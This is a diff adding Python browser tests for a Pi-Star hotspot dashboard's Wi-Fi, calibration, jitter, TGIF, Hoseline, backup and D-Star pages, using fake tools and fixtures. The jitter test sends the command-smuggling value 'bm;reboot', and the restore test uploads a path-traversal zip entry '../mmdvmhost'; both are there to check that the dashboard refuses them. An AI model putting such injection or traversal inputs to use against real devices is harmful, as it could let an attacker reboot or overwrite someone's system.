+    equal("tab A: no second install", meta(), written)
+    go("wifi-conf", 1)
+    equal("reload shows tab B's country", v.js("return document.querySelector('select[aria-label=\"WiFi Country Code\"]').value"), "DE")
+    # 5. invalid input: the page blocks it, the API refuses it with the helper's reason
+    v.click('input[value="Add Network"]')
+    v.type_into('input[aria-label="SSID 1"]', "QA-Short")
+    v.type_into('input[aria-label="PSK 1"]', "short")
+    equal("invalid PSK disables Save", v.js("return document.querySelector('form input[type=submit]').disabled"), True)
+    status, body = post({"action": "save", "country": "DE", "networks": [{"id": "0", "ssid": "QA-Second", "psk": ""}, {"ssid": "QA-Short", "psk": "short"}]})
+    equal("invalid PSK status", (status, body.strip()), (422, "network 1: PSK must be 8-63 printable ASCII characters or exactly 64 hex characters"))
+    status, _ = post({"action": "save", "country": "XX", "networks": []})
+    equal("invalid country status", status, 422)
+    equal("invalid input keeps the file", on_disk(), first_write)
+    equal("invalid input: no install", meta(), written)
+    # 6. the stand has no wlan0: status, Reset and Scan say so without touching anything
+    go("wifi")
+    page_text("Interface is not present")
+    v.click('input[value="Reset WiFi Adapter"]')
+    page_text("Interface wlan0 is not present")
+    go("wifi-conf", 1)
+    v.click('input[value="Scan for Networks (10 secs)"]')
+    page_text("Interface wlan0 is not present")
+    equal("adapter commands keep the file", meta(), written)
+    equal("Wi-Fi restarts", stand.restarts(), history)
+    same_pair("Wi-Fi leaves radio files", stand.pair(), original)
+    print("PASS Chromium Wi-Fi (wpa_supplicant): two networks listed without keys; save without CSRF 403; Delete + Save "
+          "sends one POST and removes only the first block (root:root 600), fresh GET shows one network; PSK change "
+          "writes the independently computed WPA hash with every other byte kept; two-tab stale form 409 without a second "
+          "install, reload shows the first write; invalid PSK blocked in the page and 422 from the API; missing wlan0 "
+          "reported by status, Reset and Scan; no restarts, radio files unchanged", flush=True)
+
+
+FAKES = Path(__file__).resolve().parent / "fixtures"
+
+
+def stand_settings(stand):
+    lines = stand.read("/etc/pistar-dashboard/pistar.conf").decode().splitlines()
+    return dict(line.split("=", 1) for line in lines if line and not line.startswith("#"))
+
+
+def install_fake(stand, fake, path, text=None):
+    """Put a test double where pistar.conf says the real tool lives."""
+    body = fake.read_text() if text is None else text
+    stand.exec("sh", "-c", 'mkdir -p "$(dirname "$1")" && printf "%s" "$2" >"$1" && chown root:root "$1" && chmod 755 "$1"',
+               "sh", path, body)
+
+
+def edit_ini(stand, path, sed):
+    """sed -i on a radio INI, keeping the fixture's mmdvm:mmdvm 640."""
+    stand.exec("sh", "-c", 'sed -i "$2" "$1" && chown mmdvm:mmdvm "$1" && chmod 640 "$1"', "sh", path, sed)
+
+
+def exercise_calibration(v, stand, origin, original):
+    """Calibration (calibration.php) through Chromium: the real Go session and
+    pistar-calibrate with a fake MMDVMCal at PISTAR_BIN_DIR (no modem)."""
+    conf = stand_settings(stand)
+    ini = conf["CONF_MMDVMHOST"]
+    unit = conf["UNIT_MMDVMHOST"]
+    inputs = "/run/pistar-qa/mmdvmcal-input"
+    install_fake(stand, FAKES / "fake-mmdvmcal", conf["PISTAR_BIN_DIR"] + "/MMDVMCal")
+    stand.exec("rm", "-f", inputs, inputs + ".args")
+    edit_ini(stand, ini, "/^UARTSpeed=/a RXOffset=100")
+    host, gw = stand.pair()
+    equal("seeded RXOffset", host.splitlines().count(b"RXOffset=100"), 1)
+
+    # pistar-calibrate first runs MMDVMCal for CALIBRATION_WARMUP seconds and
+    # tells it to quit, as pistar-mmdvmcal does; that run's q comes first.
+    warm = "q" if int(conf["CALIBRATION_WARMUP"]) else ""
+
+    def keys():
+        return stand.read(inputs).decode().removeprefix(warm) if stand.exists(inputs) else ""
+
+    def text(selector):
+        return v.js("return document.querySelector(arguments[0])?.textContent ?? null", selector)
+
+    def led(name):
+        return v.js("return document.querySelector(arguments[0])?.getAttribute('src') ?? ''", "#led" + name)
+
+    def go(fragment):
+        v.command("/url", {"url": origin + "/manage/#power"})
+        v.command("/url", {"url": origin + "/manage/#" + fragment})
+        wait(fragment + " did not load", lambda: v.js("const b=document.querySelector('#btnStart'); return !!b && !b.disabled"))
+
+    def start_again():
+        return v.command('/execute/async', {'script': """const done=arguments[arguments.length-1];
+          fetch('/manage/api/calibration',{cache:'no-store'}).then(r=>r.json()).then(d=>fetch('/manage/api/calibration',
+          {method:'POST',headers:{'Content-Type':'application/json','X-PiStar-CSRF':d.csrf},body:JSON.stringify({action:'start'})}))
+          .then(r=>done(r.status))""", 'args': []})
+
+    go("calibration-debug")
+    equal("Base Freq.", text("#lblBaseFreq"), "435000000 Hz")
+    equal("Frequency", text("#lblFrequency"), "435000100 Hz")
+    equal("Offset", text("#lblOffset"), "100")
+    history = stand.restarts()
+    # 1. Start: MMDVMHost held, MMDVMCal on the configured port, output on the page,
+    #    then the page sets the saved frequency (RXFrequency + RXOffset) with e.
+    v.click("#btnStart")
+    wait("MMDVMCal output on the page", lambda: "Version: 1" in (text("#tail") or ""), timeout=20)
+    equal("held for calibration", stand.restarts(), history + [unit + " stop"])
+    equal("MMDVMCal runs", stand.read(inputs + ".args").decode().splitlines(), ["115200 /dev/ttyAMA0"] * (2 if warm else 1))
+    wait("saved frequency sent", lambda: keys() == "e435000100\n", timeout=10)
+    wait("frequency shown", lambda: text("#lblFrequency") == "435000100 Hz")
+    time.sleep(1)  # the page ignores keys while the e request is still open (sendcmd_lock)
+    # 2. buttons reach MMDVMCal's stdin
+    v.click("#btnDStar")
+    wait("D-Star key", lambda: keys() == "e435000100\nk")
+    wait("D-Star LED", lambda: "20green" in led("DStar") and "20green" in led("Start"))
+    v.click("#btnFreqP")
+    wait("F key", lambda: keys() == "e435000100\nkF")
+    wait("offset 150 shown", lambda: text("#lblOffset") == "150" and text("#lblFrequency") == "435000150 Hz")
+    # 3. a second concurrent session is refused and changes nothing
+    equal("second start", start_again(), 409)
+    equal("second start restarts", stand.restarts(), history + [unit + " stop"])
+    # 4. Save Offset writes exactly [Modem] RXOffset, keeps owner and mode, restarts nothing
+    v.click("#btnSaveOffset")
+    saved = host.replace(b"RXOffset=100\n", b"RXOffset=150\n")
+    wait("RXOffset saved", lambda: stand.pair()[0] == saved)
+    same_pair("Save Offset", stand.pair(), (saved, gw))
+    equal("MMDVMHost owner and mode", stand.exec("stat", "-c", "%U:%G %a", ini).stdout.decode().strip(), "mmdvm:mmdvm 640")
+    equal("Save Offset restarts", stand.restarts(), history + [unit + " stop"])
+    # 5. a stale page is refused and keeps the newer file
+    edit_ini(stand, ini, "s/^RXOffset=150$/RXOffset=175/")
+    newer = stand.pair()[0]
+    v.click("#btnSaveOffset")
+    wait("stale save not refused", lambda: v.js("return document.body.innerText.includes('changed since this page was loaded')"))
+    same_pair("stale Save Offset", stand.pair(), (newer, gw))
+    # 6. Stop: MMDVMCal quits, MMDVMHost is restarted once
+    v.click("#btnStop")
+    wait("MMDVMHost restored", lambda: stand.restarts() == history + [unit + " stop", unit + " ok"], timeout=20)
+    equal("q reached MMDVMCal", keys(), "e435000100\nkFq")
+    wait("Finnished on the page", lambda: "Finnished..." in (text("#tail") or "") and "20red" in led("Start"))
+    wait("Start enabled again", lambda: v.js("return !document.querySelector('#btnStart').disabled"))
+    history = stand.restarts()
+    # 7. a page that goes away: the board stops the session and restores MMDVMHost
+    v.click("#btnStart")
+    wait("second session output", lambda: (text("#tail") or "").count("Version: 1") == 2, timeout=20)
+    v.command("/url", {"url": origin + "/manage/#power"})
+    idle = int(conf["CALIBRATION_IDLE_TIMEOUT"])
+    wait("idle session restored", lambda: stand.restarts() == history + [unit + " stop", unit + " ok"], timeout=idle + 30)
+    same_pair("calibration leaves the files", stand.pair(), (newer, gw))
+    print("PASS Chromium Calibration: Start holds MMDVMHost and runs MMDVMCal on the [Modem] port, output and the saved "
+          "frequency (e RXFrequency+RXOffset) shown; D-Star and + reach MMDVMCal's stdin; a second start 409; Save Offset "
+          "writes exactly [Modem] RXOffset (mmdvm:mmdvm 640, no restart); stale page 409 keeps the newer file; Stop and an "
+          "abandoned page both restart MMDVMHost once", flush=True)
+
+
+def exercise_jitter(v, stand, origin, original):
+    """Expert Jitter Test (jitter_test.php) through Chromium with a fake pistar-jittertest at PISTAR_SBIN_DIR."""
+    conf = stand_settings(stand)
+    log = conf["PISTAR_JITTER_LOG"]
+    # The fake answers at once, then stays running for a few seconds.
+    fake = (FAKES / "fake-jittertest").read_text().replace('sleep "${FAKE_JITTER_SLEEP:-0}"', "sleep 4")
+    install_fake(stand, FAKES / "fake-jittertest", conf["PISTAR_SBIN_DIR"] + "/pistar-jittertest", fake)
+    stand.exec("sh", "-c", 'mkdir -p "$(dirname "$1")" && printf "old run\\n" >"$1"', "sh", log)
+    history = stand.restarts()
+
+    def tail():
+        return v.js("return document.querySelector('#tail')?.textContent ?? ''")
+
+    def running():
+        return v.command('/execute/async', {'script': """const done=arguments[arguments.length-1];
+          fetch('/manage/api/expert/jitter',{cache:'no-store'}).then(r=>r.json()).then(d=>done(d.running))""", 'args': []})
+
+    def start_again(group):
+        return v.command('/execute/async', {'script': """const [group,done]=arguments;
+          fetch('/manage/api/expert/jitter',{cache:'no-store'}).then(r=>r.json()).then(d=>fetch('/manage/api/expert/jitter',
+          {method:'POST',headers:{'Content-Type':'application/json','X-PiStar-CSRF':d.csrf},body:JSON.stringify({group})}))
+          .then(r=>done(r.status))""", 'args': [group]})
+
+    expected = lambda group: "".join(f"{group}_Host_{n}\t\t\tAvg RTT: 2{n}.00ms\tPeak Deviation: 0.{n}0ms\n" for n in (1, 2, 3))
+    v.command("/url", {"url": origin + "/manage/#power"})
+    v.command("/url", {"url": origin + "/manage/#expert-tool-jitter-brandmeister"})
+    wait("BrandMeister results on the page", lambda: tail() == "Starting test, please wait...\n" + expected("BM"), timeout=15)
+    equal("log replaced by the BM run", stand.read(log).decode(), expected("BM"))
+    equal("log mode", stand.exec("stat", "-c", "%U:%G %a", log).stdout.decode().strip(), "root:root 644")
+    # one run at a time
+    equal("still running", running(), True)
+    equal("second run", start_again("hblink"), 409)
+    wait("run finished", lambda: running() is False, timeout=20)
+    equal("unknown group", start_again("bm;reboot"), 400)
+    # no group: DMR+, as jitter_test.php
+    v.command("/url", {"url": origin + "/manage/#power"})
+    v.command("/url", {"url": origin + "/manage/#expert-tool-jitter"})
+    wait("DMR+ results on the page", lambda: tail() == "Starting test, please wait...\n" + expected("DMR+"), timeout=15)
+    equal("log replaced by the DMR+ run", stand.read(log).decode(), expected("DMR+"))
+    wait("second run finished", lambda: running() is False, timeout=20)
+    equal("jitter restarts", stand.restarts(), history)
+    same_pair("jitter leaves the radio files", stand.pair(), original)
+    print("PASS Chromium Jitter Test: #expert-tool-jitter-brandmeister runs pistar-jittertest BM into a cleared log "
+          "(root:root 644) and shows it; a second run 409 while one runs; unknown group 400; no group runs DMR+; no restarts",
+          flush=True)
+
+
+TGIF_ID = "234123401"
+TGIF_LOG = "/run/pistar-qa/tgif-requests"
+# Matches the TGIFSTG1 format of tgif_static_common.php; a stand-only value.
+TGIF_TOKEN = "TGIFSTG1.00112233445566aa.bbccddeeff001122." + "QaStandOnlyToken_" + "x" * 30
+
+
+def exercise_tgif(v, stand, origin, original):
+    """TGIF connections table and both TGIF managers, against the fake TGIF API run by run.sh --tgif."""
+    history = stand.restarts()
+    seen = []
+
+    def requests():
+        data = stand.read(TGIF_LOG).decode() if stand.exists(TGIF_LOG) else ""
+        return [json.loads(line) for line in data.splitlines()]
+
+    def new_requests(before):
+        return [{k: r[k] for k in ("scheme", "method", "path", "body", "auth")} for r in requests()[before:]]
+
+    def network():
+        # Every request and response body of the admin API seen by Chromium.
+        for e in v.events():
+            p = e["params"]
+            if e["method"] == "Network.requestWillBeSent" and "/manage/api/" in p["request"]["url"]:
+                seen.append(p["request"]["url"] + " " + p["request"].get("postData", ""))
+            if e["method"] == "Network.responseReceived" and "/manage/api/links" in p["response"]["url"]:
+                try:
+                    seen.append(v.cdp("Network.getResponseBody", {"requestId": p["requestId"]})["body"])
+                except Exception:  # a body the page dropped (204 or reload) carries nothing to leak
+                    pass
+
+    def no_token(stage):
+        network()
+        html = v.js("return document.documentElement.outerHTML")
+        for name, text in (("page", html), ("network", "\n".join(seen))):
+            if TGIF_TOKEN in text or "TGIFSTG1" in text:
+                raise AssertionError(f"{stage}: TGIF token visible in {name} text")
+
+    def cells():
+        return v.js("const r = document.querySelector('#tgifStaticConnects table tr:nth-child(2)');"
+                    "return r ? [...r.cells].map(c => c.innerText.trim()) : null")
+
+    def submit(value):
+        v.js("[...document.querySelectorAll('input[type=submit]')].find(b => b.value === arguments[0]).click()", value)
+
+    def output(text):
+        wait(f"command output {text!r}", lambda: v.js(
+            "return [...document.querySelectorAll('td')].some(td => td.innerText.trim() === arguments[0])", text))
+
+    def manager(tg, slot, action, button):
+        v.type_into('input[name="tgifStaticTalkgroup"]', tg)
+        v.js(f"document.getElementById('{slot}').click(); document.getElementById('{action}').click()")
+        submit(button)
+
+    def write_token(value):
+        stand.exec("sh", "-c", 'umask 077; printf "[key]\\napikey=%s\\n" "$1" >"$2"; chown pistar-wizard:pistar-wizard "$2"',
+                   "sh", value, "/etc/tgifapi.key")
+
+    stand.exec("rm", "-f", TGIF_LOG)
+    write_token(TGIF_TOKEN)
+    v.events()
+    # 1. the admin page paints at once: placeholder row first, TGIF data later (the fake API waits 1.5 s)
+    v.command("/url", {"url": origin + "/manage/#power"})
+    v.command("/url", {"url": origin + "/manage/"})
+    wait("TGIF placeholder", lambda: cells() == ["tgif.network", TGIF_ID, "…", "…"])
+    equal("TGIF Manager form with the placeholder",
+          v.js("return ['Set Static','Set Dynamic'].every(x => [...document.querySelectorAll('input[type=submit]')].some(b => b.value === x))"), True)
+    equal("legacy manager hidden", v.js("return !!document.querySelector('input[name=tgifNumber]')"), False)
+    wait("TGIF table filled", lambda: cells() == ["tgif.network", TGIF_ID, "TG91(1)\nTG235(2)", "TG9990(2)"], timeout=10)
+    got = new_requests(0)
+    equal("initial TGIF requests", sorted((r["method"], r["path"], r["auth"]) for r in got),
+          [("GET", f"/v1/dynamic-talkgroups/{TGIF_ID}", "token"), ("GET", f"/v1/static-talkgroups/{TGIF_ID}", "token")])
+    no_token("table")
+    # 2. add a static TG on TS1: exactly one POST with the classic body, then the table is reloaded
+    before = len(requests())
+    manager("31665", "rbTgifTS1", "rbTgifAdd", "Set Static")
+    output("Static Talkgroup added.")
+    equal("add static request", new_requests(before)[:1],
+          [{"scheme": "https", "method": "POST", "path": f"/v1/static-talkgroups/{TGIF_ID}",
+            "body": '{"slot":1,"talkgroup":31665}', "auth": "token"}])
+    wait("table shows the added TG", lambda: (cells() or [""] * 3)[2] == "TG91(1)\nTG235(2)\nTG31665(1)", timeout=12)
+    # 3. remove a static TG on TS2: exactly one DELETE
+    before = len(requests())
+    manager("235", "rbTgifTS2", "rbTgifDel", "Set Static")
+    output("Static Talkgroup removed.")
+    equal("remove static request", new_requests(before)[:1],
+          [{"scheme": "https", "method": "DELETE", "path": f"/v1/static-talkgroups/{TGIF_ID}",
+            "body": '{"slot":2,"talkgroup":235}', "auth": "token"}])
+    wait("table without the removed TG", lambda: (cells() or [""] * 3)[2] == "TG91(1)\nTG31665(1)", timeout=12)
+    # 4. Set Dynamic / Remove unlinks with TG 4000
+    before = len(requests())
+    manager("91", "rbTgifTS2", "rbTgifDel", "Set Dynamic")
+    output("Dynamic Talkgroup unlinked.")
+    equal("dynamic unlink request", new_requests(before)[:1],
+          [{"scheme": "https", "method": "POST", "path": f"/v1/dynamic-talkgroups/{TGIF_ID}",
+            "body": '{"slot":2,"talkgroup":4000}', "auth": "token"}])
+    wait("dynamic cell after unlink", lambda: (cells() or [""] * 4)[3] == "None", timeout=12)
+    # 5. an invalid talkgroup is refused by the board and never reaches TGIF
+    before = len(requests())
+    manager("0", "rbTgifTS1", "rbTgifAdd", "Set Static")
+    output("Enter a valid talkgroup and timeslot.")
+    equal("invalid TG sent nothing", new_requests(before), [])
+    wait("form back after the refusal", lambda: v.js("return !!document.querySelector('input[name=tgifStaticTalkgroup]')"))
+    no_token("static manager")
+    # 6. no token: the legacy link manager replaces both, and sends no Authorization
+    write_token("None")
+    v.command("/url", {"url": origin + "/manage/#power"})
+    v.command("/url", {"url": origin + "/manage/"})
+    wait("legacy TGIF manager", lambda: v.js("return !!document.querySelector('input[name=tgifNumber]')"))
+    equal("static table hidden", v.js("return !!document.getElementById('tgifStaticConnects')"), False)
+    equal("static manager hidden", v.js("return !!document.querySelector('input[name=tgifStaticTalkgroup]')"), False)
+    before = len(requests())
+    v.type_into('input[name="tgifNumber"]', "91")
+    v.js("document.querySelector('input[name=tgifSlot][value=\"1\"]').click();"
+         "document.querySelector('input[name=tgifAction][value=LINK]').click()")
+    submit("Modify Static")
+    output("TGIF API: OK")
+    # The stand hotspot is simplex (Slot1=0), so tgif_manager.php always targets TS2 (slot index 1).
+    equal("legacy request", new_requests(before),
+          [{"scheme": "http", "method": "GET", "path": f"/api/sessions/update/{TGIF_ID}/1/91", "body": "", "auth": ""}])
+    no_token("legacy manager")
+    wizard_log = stand.read("/tmp/pistar-wizard.log").decode(errors="replace")
+    if TGIF_TOKEN in wizard_log:
+        raise AssertionError("TGIF token in the wizard log")
+    same_pair("TGIF leaves radio files", stand.pair(), original)
+    equal("TGIF restarts", stand.restarts(), history)
+    print("PASS Chromium TGIF: admin page paints the classic table with placeholders, then the fake API's static "
+          "TG91(1) TG235(2) and dynamic TG9990(2); Set Static add/remove and Set Dynamic remove send exactly one "
+          "POST/DELETE/POST with the classic JSON and Bearer token, the table reloads; TG 0 refused without a request; "
+          "without a token the legacy manager sends one GET sessions/update/<id>/1/91 (simplex TS2) without "
+          "Authorization; token absent from page, network bodies and wizard log; radio files and services untouched", flush=True)
+
+
+HOSELINE_LOG = "/run/pistar-qa/hoseline-events"
+HOSELINE_SOURCE = 2340001  # fake_hoseline.py --source
+
+
+def exercise_hoseline(v, stand, origin, original):
+    """BrandMeister Hoseline player under Local RF Activity, against fake_hoseline.py run by run.sh --hoseline."""
+    history = stand.restarts()
+    conf = stand_settings(stand)
+    groups = [int(g) for g in conf["HOSELINE_TALKGROUPS"].split(",")]
+    limit = int(conf["HOSELINE_MAX_LISTENERS"])
+    socket_url = "wss" + origin[len("https"):] + "/manage/api/hoseline?tg="
+
+    def log():
+        data = stand.read(HOSELINE_LOG).decode() if stand.exists(HOSELINE_LOG) else ""
+        return [json.loads(line) for line in data.splitlines()]
+
+    def spotter(kind, after=0):
+        return [e for e in log()[after:] if e["event"] == kind]
+
+    def status():
+        return v.js("return document.getElementById('hoselineStatus')?.innerText.trim() ?? null")
+
+    def sockets(events, url):
+        created = {e["params"]["requestId"] for e in events
+                   if e["method"] == "Network.webSocketCreated" and e["params"]["url"] == url}
+        frames = [e["params"]["response"] for e in events
+                  if e["method"] == "Network.webSocketFrameReceived" and e["params"]["requestId"] in created]
+        closed = [e for e in events if e["method"] == "Network.webSocketClosed" and e["params"]["requestId"] in created]
+        return created, frames, closed
+
+    def no_console_errors(stage, refused=False):
+        # A refused handshake (the limit check) is logged by Chromium itself.
+        for entry in v.command("/se/log", {"type": "browser"}):
+            text = entry.get("message", "")
+            if ("Content Security Policy" in text or "Uncaught" in text
+                    or ("hoseline" in text.lower() and not (refused and "503" in text))):
+                raise AssertionError(f"{stage}: browser console: {text}")
+
+    v.events()
+    v.command("/url", {"url": origin + "/manage/#power"})
+    v.command("/url", {"url": origin + "/manage/"})
+    # 1. the player sits under Local RF Activity and offers the configured talkgroups
+    wait("Hoseline talkgroups", lambda: v.js("return document.querySelectorAll('select[name=hoselineTalkgroup] option').length") > 0,
+         timeout=15)
+    equal("Hoseline placement", v.js("const h = document.querySelector('#localTxs ~ #hoseline');"
+                                     "return h ? h.querySelector('b').innerText.trim() : null"), "BrandMeister Hoseline")
+    equal("offered talkgroups", v.js("return [...document.querySelectorAll('select[name=hoselineTalkgroup] option')].map(o => o.value)"),
+          [str(g) for g in sorted(set(groups))])
+    equal("default talkgroup", v.js("return document.querySelector('select[name=hoselineTalkgroup]').value"), "91")
+    equal("idle status", status(), "Stopped")
+    equal("no relay before Play", spotter("open"), [])
+    # 2. Play (a real click: the AudioContext needs a user gesture) opens one relay for the selected TG
+    tg = groups[1] if len(groups) > 1 else groups[0]
+    v.js("const s = document.querySelector('select[name=hoselineTalkgroup]'); s.value = arguments[0];"
+         "s.dispatchEvent(new Event('change', {bubbles: true}))", str(tg))
+    before = len(log())
+    v.click('input[name="hoselinePlay"]')
+    wait("listening status", lambda: (status() or "").startswith(f"Listening to TG {tg}"), timeout=10)
+    wait("caller shown", lambda: status() == f"Listening to TG {tg}: {HOSELINE_SOURCE}", timeout=10)
+    equal("caller link", v.js("return document.querySelector('#hoselineStatus a')?.href"),
+          f"https://database.radioid.net/database/view?id={HOSELINE_SOURCE}")
+    opened = spotter("open", before)
+    equal("one upstream connection", [(e["token"], e["origin"], e["spotter"]) for e in opened],
+          [(True, "https://" + urlsplit(conf["HOSELINE_PAGE_URL"]).netloc, True)])
+    equal("subscription", [(e["id"], e["tg"]) for e in spotter("subscribe", before)], [(opened[0]["id"], tg)])
+    # 3. μ-law audio reaches the browser as binary WebSocket frames
+    wait("audio frames", lambda: spotter("call", before), timeout=10)
+    events = v.events()
+    created, frames, _ = sockets(events, socket_url + str(tg))
+    equal("browser sockets for the TG", len(created), 1)
+    audio = [f for f in frames if f["opcode"] == 2]
+    texts = [json.loads(f["payloadData"]) for f in frames if f["opcode"] == 1]
+    if len(audio) < 10 or any(len(base64.b64decode(f["payloadData"])) != 480 for f in audio):
+        raise AssertionError(f"audio frames: {len(audio)} {[len(base64.b64decode(f['payloadData'])) for f in audio][:5]}")
+    equal("first relay events", texts[:2], [{"type": "listening", "tg": tg}, {"type": "start", "source": HOSELINE_SOURCE}])
+    if {"type": "end"} not in texts:
+        raise AssertionError(f"no call end event: {texts}")
+    equal("playback", "unavailable" in status(), False)
+    no_console_errors("playing")
+    # 4. Stop closes the browser socket and the relay closes its upstream connection
+    v.click('input[name="hoselineStop"]')
+    wait("stopped status", lambda: status() == "Stopped")
+    wait("upstream closed", lambda: [e["id"] for e in spotter("close", before)] == [opened[0]["id"]], timeout=10)
+    wait("browser socket closed", lambda: sockets(events + v.events(), socket_url + str(tg))[2])
+    # 5. with HOSELINE_MAX_LISTENERS other listeners, Play reports the limit and opens no relay
+    before = len(log())
+    v.js("window.qaHoseline = Array.from({length: arguments[1]}, () => new WebSocket(arguments[0]))",
+         socket_url + str(groups[0]), limit)
+    wait(f"{limit} listeners", lambda: len(spotter("subscribe", before)) == limit, timeout=10)
+    v.click('input[name="hoselinePlay"]')
+    wait("limit error", lambda: status() == f"Too many listeners: all {limit} Hoseline slots are in use. Try again later.",
+         timeout=10)
+    equal("no extra upstream connection", len(spotter("open", before)), limit)
+    v.js("window.qaHoseline.forEach(s => s.close())")
+    wait("listeners closed", lambda: len(spotter("close", before)) == limit, timeout=10)
+    no_console_errors("limit", refused=True)
+    # 6. without AudioWorklet (the operator page over plain HTTP is not a secure
+    #    context) the player schedules buffer sources instead of failing
+    v.js("""Object.defineProperty(BaseAudioContext.prototype, 'audioWorklet', {get: () => undefined, configurable: true});
+            window.qaSources = 0; const orig = BaseAudioContext.prototype.createBufferSource;
+            BaseAudioContext.prototype.createBufferSource = function () { window.qaSources++; return orig.call(this); };""")
+    v.click('input[name="hoselinePlay"]')
+    wait("fallback plays audio", lambda: v.js("return window.qaSources") > 0, timeout=15)
+    if "unavailable" in status():
+        raise AssertionError("fallback reported: " + status())
+    v.click('input[name="hoselineStop"]')
+    wait("fallback stopped", lambda: status() == "Stopped")
+    same_pair("Hoseline leaves radio files", stand.pair(), original)
+    equal("Hoseline restarts", stand.restarts(), history)
+    print("PASS Chromium Hoseline: table under Local RF Activity lists HOSELINE_TALKGROUPS (TG91 default); Play opens "
+          f"one relay for TG{tg} (spotter saw the page token, Origin and the spotter subprotocol, then [1,[{tg}]]); "
+          f"480-byte μ-law frames and start/end events arrive, the status links caller {HOSELINE_SOURCE}; Stop closes "
+          f"the upstream; with {limit} listeners open Play shows the limit error without a new relay; without AudioWorklet "
+          "(plain HTTP) audio plays through scheduled buffer sources; no CSP errors; "
+          "radio files and services untouched", flush=True)
+
+
+def exercise_backup(v, stand, origin, folder, original):
+    """Classic Backup/Restore through Chromium against the real helper."""
+    import base64
+    import io
+    host, gw = original
+    v.command("/url", {"url": origin + "/manage/#backup"})
+    wait("backup page did not load", lambda: v.js("return !!document.querySelector('input[type=file]')"))
+    blob = v.command('/execute/async', {'script': """fetch('/manage/api/backup/classic').then(async r => {
+        const b = new Uint8Array(await r.arrayBuffer()); let s=''; for (const x of b) s += String.fromCharCode(x);
+        arguments[arguments.length-1]([r.status, r.headers.get('content-disposition'), btoa(s)]); })""", 'args': []})
+    equal("backup status", blob[0], 200)
+    assert re.search(r'filename="Pi-Star_Config_[^"]+_\d{4}-[A-Z][a-z]{2}-\d{2}\.zip"', blob[1]), blob[1]
+    archive = base64.b64decode(blob[2])
+    with ZipFile(io.BytesIO(archive)) as z:
+        names = set(z.namelist())
+        equal("backup mmdvmhost", z.read("mmdvmhost"), host)
+        equal("backup dmrgateway", z.read("dmrgateway"), gw)
+    assert not any(n.endswith(".php") for n in names), names
+    history = stand.restarts()
+    # change both files, then restore the archive through the page
+    stand.exec("sed", "-i", "s/^Callsign=DEMO1$/Callsign=CHANGED/", "/etc/MMDVM-Host.ini")
+    stand.exec("sed", "-i", "s/^Address=192.0.2.11$/Address=192.0.2.99/", "/etc/DMRGateway.ini")
+    assert stand.pair() != original
+    path = folder / "restore.zip"
+    path.write_bytes(archive)
+    v.choose_file("input[type=file]", path)
+    v.js("window.confirm = () => true")
+    v.click("button.icon")
+    wait("restore did not finish", lambda: v.js("return document.body.innerText.includes('Configuration restored.')"))
+    same_pair("restored files", stand.pair(), original)
+    equal("restore modes", stand.exec("stat", "-c", "%a", "/etc/MMDVM-Host.ini", "/etc/DMRGateway.ini").stdout.decode().split(), ["644", "644"])
+    history += ["dmrgateway.service ok", "mmdvmhost.service ok"]
+    equal("restore restarts", stand.restarts(), history)
+    # an unsafe archive is refused without touching anything
+    bad = io.BytesIO()
+    with ZipFile(bad, "w") as z:
+        z.writestr("../mmdvmhost", "[General]\nCallsign=EVIL\n")
+    path.write_bytes(bad.getvalue())
+    v.command("/url", {"url": origin + "/manage/#expert"})
+    v.command("/url", {"url": origin + "/manage/#backup"})
+    wait("backup page did not reload", lambda: v.js("return !!document.querySelector('input[type=file]')"))
+    v.choose_file("input[type=file]", path)
+    v.js("window.confirm = () => true")
+    v.click("button.icon")
+    wait("unsafe archive not refused", lambda: v.js("return document.body.innerText.includes('has an unsafe name')"))
+    same_pair("refused archive", stand.pair(), original)
+    equal("refused archive restarts", stand.restarts(), history)
+    print("PASS Chromium Backup/Restore: classic zip download (Pi-Star_Config_<host>_<Y-M-d>.zip, classic member names, "
+          "exact file bytes, no PHP), restore of changed files back to the archive with modes kept and DMRGateway then "
+          "MMDVMHost restarted, unsafe archive refused without writes or restarts", flush=True)
+
+DSTAR_FIXTURES = Path(__file__).resolve().parents[2] / "panel/testdata/dstar"
+DSTAR_CALLS = "/run/pistar-qa/remotecontrold-calls"
+DSTAR_PASSWORD = "rc-Secret-7"  # remotePassword of the ircddbgateway fixture
+DSTAR_ACCEPTED = "remotecontrold: command accepted by the gateway/starnetserver"
+
+
+def exercise_dstar(v, stand, origin, original):
+    """D-Star panels (dstarrepeater/*.php) for both controllers and the D-Star Link
+    Manager, with classic fixture logs and a fake remotecontrold at PISTAR_BIN_DIR."""
+    conf = stand_settings(stand)
+    host_ini = conf["CONF_MMDVMHOST"]
+    logs, hosts = conf["PISTAR_LOG_DIR"], conf["PISTAR_HOSTS_DIR"]
+    markers = conf["MARKER_MMDVMHOST"], conf["MARKER_DSTARREPEATER"]
+    history = stand.restarts()
+    seen = []
+
+    def put(path, data, mode="644"):
+        stand.exec("sh", "-c", 'mkdir -p "$(dirname "$1")" && printf "%s" "$2" >"$1" && chown root:root "$1" && chmod "$3" "$1"',
+                   "sh", path, data, mode)
+
+    for name in ("Links.log", "Headers.log", "STARnet.log"):
+        put(f"{logs}/{name}", (DSTAR_FIXTURES / name).read_text())
+    for name in ("DCS_Hosts.txt", "DPlus_Hosts.txt", "DExtra_Hosts.txt"):
+        put(f"{hosts}/{name}", (DSTAR_FIXTURES / name).read_text())
+    put(conf["CONF_IRCDDBGATEWAY"], (DSTAR_FIXTURES / "ircddbgateway").read_text())
+    install_fake(stand, FAKES / "fake-remotecontrold", conf["PISTAR_BIN_DIR"] + "/remotecontrold")
+    stand.exec("sh", "-c", 'rm -f "$1" && touch "$1" && chown pistar-wizard:pistar-wizard "$1"', "sh", DSTAR_CALLS)
+    # MMDVMHost with D-Star and the D-Star network; the panels read the INI as pistar-wizard.
+    stand.exec("sh", "-c", 'printf "\\n[D-Star]\\nEnable=1\\n\\n[D-Star Network]\\nEnable=1\\n" >>"$1" && chmod 644 "$1"', "sh", host_ini)
+    stand.exec("sh", "-c", 'rm -f "$2" && touch "$1"', "sh", *markers)
+
+    def calls():
+        return [json.loads(line) for line in stand.read(DSTAR_CALLS).decode().splitlines()]
+
+    def rows(selector):
+        return v.js("return [...document.querySelectorAll(arguments[0])].map(r => [...r.cells].map(c => "
+                    "c.textContent.replace(/\\u00a0/g, ' ').trim()))", selector)
+
+    def reload():
+        v.command("/url", {"url": origin + "/manage/#power"})
+        v.command("/url", {"url": origin + "/manage/"})
+
+    def choose(name, value):
+        v.js("const e=document.querySelector(`#dstarLinkManager [name=\"${arguments[0]}\"]`); e.value=arguments[1];"
+             "e.dispatchEvent(new Event('change',{bubbles:true}))", name, value)
+
+    def request(module, ref, letter, action="LINK"):
